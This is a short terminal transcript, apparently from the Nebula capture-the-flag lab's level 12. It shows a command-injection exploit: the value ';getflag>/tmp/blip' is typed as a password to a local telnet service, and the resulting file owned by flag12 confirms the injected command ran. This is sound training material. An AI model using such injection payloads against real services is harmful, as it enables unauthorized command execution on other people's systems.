```
level12@nebula:~$ telnet localhost 50001
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: ;getflag>/tmp/blip
Better luck next time
Connection closed by foreign host.
level12@nebula:~$ ls -la /tmp
total 4
drwxrwxrwt 6 root   root   140 2016-06-07 14:24 .
drwxr-xr-x 1 root   root   240 2016-06-07 16:18 ..
-rw-r--r-- 1 flag12 flag12  59 2016-06-07 14:24 blip
drwxrwxrwt 2 root   root    40 2016-06-07 16:18 .ICE-unix
drwxrwxrwt 2 root   root    40 2016-06-07 16:18 VMwareDnD
drwx------ 2 root   root   100 2016-06-07 16:18 vmware-root
drwxrwxrwt 2 root   root    40 2016-06-07 16:18 .X11-unix
level12@nebula:~$ cat /tmp/blip
You have successfully executed getflag on a target account

```
